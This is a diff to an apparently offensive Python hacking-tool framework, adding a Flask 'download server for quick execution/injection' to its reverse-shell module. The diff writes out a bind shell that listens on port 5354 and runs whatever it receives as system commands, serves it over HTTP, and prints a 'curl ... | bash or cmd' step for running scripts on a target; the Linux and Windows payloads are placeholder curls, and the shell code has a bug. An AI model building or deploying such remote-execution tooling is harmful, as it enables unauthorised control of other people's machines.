@@ -1,9 +1,14 @@
+from tkinter import E
+
+import flask
 import modules.plugin as plugin
 from os import system
 import threading
 import logging
 from time import sleep
-from concurrent.futures import ThreadPoolExecuter
+from concurrent.futures import ThreadPoolExecutor
+import ctypes
+import multiprocessing
 
 log = logging.getLogger('werkzeug')
 log.disabled = True
@@ -36,7 +41,7 @@ class essensials:
         try:
             a = str(input(string))
         except:
-            if q: print("\nctrl+c"); quit()
+            if q: sysVar.rsSite = False; print("\nctrl+c"); quit()
             else: return False
         return a
 
@@ -51,15 +56,10 @@ class EndpointAction(object):
     """
     https://stackoverflow.com/questions/40460846/using-flask-inside-class
 
-    line 64
+    line 74
     """
 
     def __init__(self, action, send="no"):
-        try:
-            from flask import Flask, Response
-        except ImportError:
-            print("[!] flask needed for script download; skipping...")
-            return
             
         self.action = action
         self.response = send
@@ -79,15 +79,36 @@ class FlaskAppWrapper(object):
 
     def __init__(self, name):
         try:
-            from flask import Flask, Response
+            from flask import Flask, request
         except ImportError:
-            print("[!] flask needed for script download; skipping...")
+            print("[!] flask needed for this")
             return
             
         self.app = Flask(name)
+        self.req = request
+        self.flsk = Flask
+
+    def shutdown(self):
+        if sysVar.rsSite:
+            if sysVar.rsAllow:
+                sysVar.rsSite = not sysVar.rsSite
+                print("[!!!] this will be depreciated eventually and i am working on a fix [!!!]")
+                func = self.req.environ.get('werkzeug.server.shutdown')
+                #func = sel
+                if func is None:
+                    raise RuntimeError('Not running with the Werkzeug Server')
+                func()
+            else:
+                return
+        else:
+            return
 
     def run(self, port, ip):
-        self.app.run(ip, port=port)
+        self.app.add_url_rule("/shutdown", "shutdown", EndpointAction(self.shutdown, send="ok"))
+        try:
+            self.app.run(ip, port=port, debug=False, use_reloader=False)
+        except RuntimeError:
+            pass
 
     def add_endpoint(self, endpoint=None, endpoint_name=None, handler=None, send="ok"):
         self.app.add_url_rule(endpoint, endpoint_name, EndpointAction(handler, send=handler()))
@@ -98,36 +119,63 @@ class modules:
     """
     class reverse_shell:
         def flaskThread(a, ip, port:int):
-            with ThreadPoolExecuter(max_workers=1) as pool:
-                site = pool.submit(a.run, port, ip)
+            process = threading.Thread(target=a.run, args=(port, ip,), daemon=True)
+            process.start()
 
-                while True:
-                    if sysVar.rsSite:
-                        pass
-                    else:
-                        site.shutdown()
-                        pool.shutdown()
 
-        def download():
+        def linux():
             """
             flask download handler
             """
-            return "bniobnjghoj"
+            return """
+curl parrot.live
+            """
+
+        def windows():
+            """
+            flask download handler
+            """
+            return """
+@echo off
+
+curl parrot.live
+            """
+
+        def script():
+            """
+            python script
+            """
+
+            # temporary
+            script = """
+import socket
+from subprocess import getoutput
+
+skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+skt.bind(("0.0.0.0", int(5354)))
+
+skt.listen()
+
+while True:
+    conn, addr = skt.connect()
+
+    with conn:
+        while True:
+            data = conn.recv(65536)
+
+            if not data:
+                break
+
+            conn.sendall(getoutput(data).encode('utf-8'))
+            """
+
+            return script
 
         def initDownload(args:list):
             """
             execute the download server for quick execution/injection
             """
-
-            if sysVar.rsSite == True:
-                if input("[!] flask server already running; close it? [Y/n]").lower() == "y":
-                    sysVar.rsSite = False
-                    print("[-] closed site")
-                    return
-                else:
-                    return
-
-            sysVar.rsSite = True
 
             try:
                 ip = args[1]
@@ -135,11 +183,41 @@ class modules:
             except:
                 print("not enough args")
                 return
+
+            try:
+                from httpx import get, RemoteProtocolError
+            except ImportError:
+                print("[!] httpx needed for this")
+                return
+
+            if sysVar.rsSite == True:
+                if input("[!] flask server already running; close it? [Y/n]").lower() == "y":
+                    sysVar.rsAllow = True
+
+                    sleep(0.5)
+
+                    try:
+                        get("http://127.0.0.1:{}/shutdown".format(port), proxies={}, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"})
+                    except RemoteProtocolError:
+                        pass
+
+                    sleep(0.5)
+
+                    print("[-] closed site")
+                    sysVar.rsAllow = False
+                    return
+                else:
+                    return
                 
             a = FlaskAppWrapper('wrap')
-            a.add_endpoint(endpoint='/', endpoint_name='m', handler=modules.reverse_shell.download)
+            a.add_endpoint(endpoint='/', endpoint_name='script', handler=modules.reverse_shell.script)
+            a.add_endpoint(endpoint='/linux', endpoint_name='linux', handler=modules.reverse_shell.linux)
+            a.add_endpoint(endpoint='/windows', endpoint_name='windows', handler=modules.reverse_shell.windows)
+            #a.add_endpoint(endpoint='/shutdown', endpoint_name='shutdown', handler=modules.reverse_shell.shutdown)
 
-            print("[+] started flask download server!\n  \\ use \"curl http://{}:{}/ | bash\" to run script") 
+            print("[+] started flask download server!\n  \\ use \"curl http://{}:{}/(linux or windows) | (bash or cmd)\" to run script".format("0.0.0.0", "80")) 
+
+            sysVar.rsSite = True
             
             threading.Thread(target=modules.reverse_shell.flaskThread, args=(a, args[1], args[2],), daemon=True).start()
 
@@ -271,6 +349,7 @@ class sysVar:
 
     runnable_plugins = []
     rsSite = False
+    rsAllow = False # allow shutdown
     activeThreads = []
 
 if __name__ == "__main__":
